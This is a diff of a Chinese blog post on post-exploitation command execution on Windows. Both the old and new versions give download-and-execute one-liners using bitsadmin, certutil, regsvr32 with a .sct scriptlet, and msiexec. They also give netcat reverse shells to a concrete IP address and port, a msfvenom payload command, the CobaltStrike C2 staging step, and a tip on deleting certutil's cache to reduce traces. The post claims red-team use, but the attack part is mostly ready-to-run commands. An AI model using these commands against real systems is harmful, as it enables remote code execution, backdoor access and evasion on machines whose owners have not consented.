@@ -16,12 +16,12 @@
   <meta name="author" content="Ninja">
   <meta name="keywords" content="">
   
-    <meta name="description" content="🚀 0、简介拿到目标shell可以使用下面几种命令执行的姿势。 📌 1、CobaltStrike 命令上线使用CobaltStrike生成powershell payload  📌 2、bitsadminbitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。 注：需要管理员权限，普通用户没有权限使用，保存文件需要绝对路径。 1bitsadmin &#x2F;transfer n">
+    <meta name="description" content="🚀 0、简介​	当我们在渗透测试中拿到目标 Shell 🐚 后，通常需要进一步执行命令、上线、维持权限。本文总结了几种常见的 Windows 命令执行姿势，供学习研究使用。  📌 1、CobaltStrike 命令上线​	使用 CobaltStrike 可以方便地生成 PowerShell Payload，用于命令行上线到 C2 💻。 📷 演示：   📌 2、bitsadmin​	bi">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Windows系统命令执行的的几种姿势">
+<meta property="og:title" content="Windows系统命令执行的几种姿势">
 <meta property="og:url" content="http://example.com/2024/07/01/Windows%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF/index.html">
 <meta property="og:site_name" content="Ninja&#39;s blog - 学与用">
-<meta property="og:description" content="🚀 0、简介拿到目标shell可以使用下面几种命令执行的姿势。 📌 1、CobaltStrike 命令上线使用CobaltStrike生成powershell payload  📌 2、bitsadminbitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。 注：需要管理员权限，普通用户没有权限使用，保存文件需要绝对路径。 1bitsadmin &#x2F;transfer n">
+<meta property="og:description" content="🚀 0、简介​	当我们在渗透测试中拿到目标 Shell 🐚 后，通常需要进一步执行命令、上线、维持权限。本文总结了几种常见的 Windows 命令执行姿势，供学习研究使用。  📌 1、CobaltStrike 命令上线​	使用 CobaltStrike 可以方便地生成 PowerShell Payload，用于命令行上线到 C2 💻。 📷 演示：   📌 2、bitsadmin​	bi">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/cs.gif">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/image-1719815226535-1.png">
@@ -33,7 +33,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/image-1-1719815236749-7.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/msiexec-calc.gif">
 <meta property="article:published_time" content="2024-07-01T09:13:20.338Z">
-<meta property="article:modified_time" content="2025-07-11T05:20:39.874Z">
+<meta property="article:modified_time" content="2025-07-11T08:06:42.183Z">
 <meta property="article:author" content="Ninja">
 <meta property="article:tag" content="命令执行">
 <meta property="article:tag" content="权限维持">
@@ -44,7 +44,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Windows系统命令执行的的几种姿势 - Ninja&#39;s blog - 学与用</title>
+  <title>Windows系统命令执行的几种姿势 - Ninja&#39;s blog - 学与用</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -262,7 +262,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Windows系统命令执行的的几种姿势"></span>
+            <span id="subtitle" data-typed-text="Windows系统命令执行的几种姿势"></span>
           
         </div>
 
@@ -285,7 +285,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          439 字
+          570 字
         
       </span>
     
@@ -296,7 +296,7 @@
         
         
         
-          4 分钟
+          5 分钟
         
       </span>
     
@@ -341,7 +341,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Windows系统命令执行的的几种姿势</h1>
+            <h1 id="seo-header">Windows系统命令执行的几种姿势</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
@@ -354,40 +354,70 @@
             
               <div class="markdown-body">
                 
-                <h4 id="🚀-0、简介"><a href="#🚀-0、简介" class="headerlink" title="🚀 0、简介"></a>🚀 0、简介</h4><p>拿到目标shell可以使用下面几种命令执行的姿势。</p>
-<h4 id="📌-1、CobaltStrike-命令上线"><a href="#📌-1、CobaltStrike-命令上线" class="headerlink" title="📌 1、CobaltStrike 命令上线"></a>📌 1、CobaltStrike 命令上线</h4><p>使用CobaltStrike生成powershell payload</p>
+                <h4 id="🚀-0、简介"><a href="#🚀-0、简介" class="headerlink" title="🚀 0、简介"></a>🚀 0、简介</h4><p>​	当我们在渗透测试中拿到目标 Shell 🐚 后，通常需要进一步执行命令、上线、维持权限。<br>本文总结了几种常见的 <strong>Windows 命令执行姿势</strong>，供学习研究使用。</p>
+<hr>
+<h4 id="📌-1、CobaltStrike-命令上线"><a href="#📌-1、CobaltStrike-命令上线" class="headerlink" title="📌 1、CobaltStrike 命令上线"></a>📌 1、CobaltStrike 命令上线</h4><p>​	使用 <strong>CobaltStrike</strong> 可以方便地生成 PowerShell Payload，用于命令行上线到 C2 💻。</p>
+<p>📷 演示：</p>
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/cs.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h4 id="📌-2、bitsadmin"><a href="#📌-2、bitsadmin" class="headerlink" title="📌 2、bitsadmin"></a>📌 2、bitsadmin</h4><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。</p>
-<p>注：需要管理员权限，普通用户没有权限使用，保存文件需要绝对路径。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitsadmin /transfer n http://xx.imortal.icu/artifact.exe C:\shell.exe &amp; start C:\shell.exe<br></code></pre></td></tr></table></figure>
+<hr>
+<h4 id="📌-2、bitsadmin"><a href="#📌-2、bitsadmin" class="headerlink" title="📌 2、bitsadmin"></a>📌 2、bitsadmin</h4><p>​	<code>bitsadmin</code> 是 Windows 内置的一个命令行工具，可用于创建下载&#x2F;上传任务，并监控其进度 🔄。</p>
+<p>⚠️ 注意：</p>
+<ul>
+<li>需要 <strong>管理员权限</strong>，普通用户无法使用。</li>
+<li>保存文件时需使用 <strong>绝对路径</strong>。</li>
+</ul>
+<p>✅ <strong>示例：下载执行文件</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitsadmin /transfer n http://xxx.com/artifact.exe C:\shell.exe &amp; start C:\shell.exe<br></code></pre></td></tr></table></figure>
 
+<p>📷 演示：</p>
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-1719815226535-1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/bitsadmin.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>使用nc反弹shell</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitsadmin /transfer n http://xx.imortal.icu/nc.exe C:\nc.exe &amp; start C:\nc.exe -t -e cmd.exe 121.4.69.24 6667<br></code></pre></td></tr></table></figure>
+<p>✅ <strong>使用 nc 反弹 shell：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitsadmin /transfer n http://xxx.com/nc.exe C:\nc.exe &amp; start C:\nc.exe -t -e cmd.exe 121.4.69.24 6667<br></code></pre></td></tr></table></figure>
 
+<p>📷 演示：</p>
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/bitsadmin-nc.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h4 id="📌-3、certutil"><a href="#📌-3、certutil" class="headerlink" title="📌 3、certutil"></a>📌 3、certutil</h4><p>certutil工具用于备份证书服务，xp-win10都支持。certutil下载文件会留下缓存，建议下载文件后对缓存进行删除。</p>
-<p>注：缓存位置</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content<br>certutil -urlcache -<span class="hljs-built_in">split</span> -f http://xx.imortal.icu/artifact.exe 7z.exe &amp; start 7z.exe<br></code></pre></td></tr></table></figure>
+<hr>
+<h4 id="📌-3、certutil"><a href="#📌-3、certutil" class="headerlink" title="📌 3、certutil"></a>📌 3、certutil</h4><p>&#x9;<code>certutil</code> 是 Windows 自带的证书服务工具 📜，可用于下载文件，适用于 <strong>XP 到 Win10</strong>。</p>
+<p>⚠️ certutil 下载文件会在本地留缓存，建议操作完成后删除缓存。</p>
+<p>✅ <strong>缓存位置：</strong></p>
+<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">USERPROFILE</span></span>%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content<br></code></pre></td></tr></table></figure>
 
+<p>✅ <strong>示例：下载并执行</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certutil -urlcache -<span class="hljs-built_in">split</span> -f http://xxx.com/artifact.exe 7z.exe &amp; start 7z.exe<br></code></pre></td></tr></table></figure>
+
+<p>📷 演示：</p>
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/certutil.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>注：certutil可以使用普通用户下运行，cs获得的权限根据命令用户的权限，普通用户不带红色闪电，使用管理员运行会带红色闪电</p>
-<p>当然也可以使用nc反弹shell</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">certutil -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://xx.imortal.icu/nc.<span class="hljs-keyword">exe</span> nc.<span class="hljs-keyword">exe</span> &amp; start nc.<span class="hljs-keyword">exe</span> -t -<span class="hljs-keyword">e</span> cmd.<span class="hljs-keyword">exe</span> <span class="hljs-number">121.4</span>.<span class="hljs-number">69.24</span> <span class="hljs-number">6667</span><br></code></pre></td></tr></table></figure>
+<p>📌 certutil 可以在 <strong>普通用户权限</strong> 下运行，若使用管理员运行（如在 CS 中带红色闪电 ⚡），可获得更高权限。</p>
+<p>✅ <strong>同样可以用 nc 反弹 shell：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certutil -urlcache -<span class="hljs-built_in">split</span> -f http://xxx.com/nc.exe nc.exe &amp; start nc.exe -t -e cmd.exe 121.4.69.24 6667<br></code></pre></td></tr></table></figure>
 
+<p>📷 演示：</p>
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/nc.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h4 id="📌-4、regsvr32"><a href="#📌-4、regsvr32" class="headerlink" title="📌 4、regsvr32"></a>📌 4、regsvr32</h4><p>regsvr32命令用于注册COM组件，是Windows系统提供用来向系统注册控件或者卸载控件的命令。我们可以通过构造.sct文件，去下载执行我们的后门程序。</p>
-<p><strong>构造.sct文件执行命令</strong></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scriptlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">registration</span>    <span class="hljs-attr">progid</span>=<span class="hljs-string">&quot;ShortJSRAT&quot;</span>    <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span> &gt;</span>    <br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml">        </span></span><br><span class="language-xml"><span class="language-handlebars">&lt;![CDATA[            </span></span><br><span class="language-xml"><span class="language-handlebars">ps  = &quot;cmd.exe /c calc.exe&quot;;            </span></span><br><span class="language-xml"><span class="language-handlebars">new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);        </span></span><br><span class="language-xml"><span class="language-handlebars">]]&gt;</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">registration</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">scriptlet</span>&gt;</span><br>regsvr32.exe /u /n /s /i:http://xx.imortal.icu/calc.sct scrobj.dll<br></code></pre></td></tr></table></figure>
+<hr>
+<h4 id="📌-4、regsvr32"><a href="#📌-4、regsvr32" class="headerlink" title="📌 4、regsvr32"></a>📌 4、regsvr32</h4><p>&#x9;<code>regsvr32</code> 是用于注册或卸载 COM 组件的命令 🧩。<br>可以通过构造 <code>.sct</code> 文件来下载并执行后门。</p>
+<p>✅ <strong>示例：构造 .sct 文件执行命令</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scriptlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">registration</span> <span class="hljs-attr">progid</span>=<span class="hljs-string">&quot;ShortJSRAT&quot;</span> <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">&lt;![CDATA[</span></span><br><span class="language-xml"><span class="language-handlebars">ps = &quot;cmd.exe /c calc.exe&quot;;</span></span><br><span class="language-xml"><span class="language-handlebars">new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);</span></span><br><span class="language-xml"><span class="language-handlebars">]]&gt;</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">registration</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">scriptlet</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/certutil1.gif" srcset="/img/loading.gif" lazyload></p>
-<h4 id="📌-5、msiexec"><a href="#📌-5、msiexec" class="headerlink" title="📌 5、msiexec"></a>📌 5、msiexec</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用msf生成msi文件，上传到vps</span><br>msfvenom -p windows/exec CMD=<span class="hljs-string">&#x27;calc.exe&#x27;</span> -f msi &gt; calc.msi<br></code></pre></td></tr></table></figure>
+<p>执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">regsvr32.exe /u /n /s /i:http://xxx.com/calc.sct scrobj.dll<br></code></pre></td></tr></table></figure>
 
+<p>📷 演示：</p>
+<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/certutil1.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
+<hr>
+<h4 id="📌-5、msiexec"><a href="#📌-5、msiexec" class="headerlink" title="📌 5、msiexec"></a>📌 5、msiexec</h4><p>&#x9;<code>msiexec</code> 可以远程执行 MSI 安装包 🎛️，可用于执行自定义 Payload。</p>
+<p>✅ <strong>示例：使用 msf 生成 MSI</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 msfvenom 生成 MSI 文件，上传至 VPS</span><br>msfvenom -p windows/exec CMD=<span class="hljs-string">&#x27;calc.exe&#x27;</span> -f msi &gt; calc.msi<br></code></pre></td></tr></table></figure>
+
+<p>📷 演示：</p>
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-1-1719815236749-7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>✅ <strong>远程执行 MSI 文件</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msiexec /q /i http://tools.imortal.icu/calc.msi<br></code></pre></td></tr></table></figure>
 
+<p>📷 演示：</p>
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/msiexec-calc.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
+<hr>
+<h4 id="⚠️-6、总结"><a href="#⚠️-6、总结" class="headerlink" title="⚠️ 6、总结"></a>⚠️ 6、总结</h4><p>&#x9;以上几种姿势都是在合法授权下进行的红队演练和渗透测试中常用的后渗透技巧 🔒。</p>
 
                 
               </div>
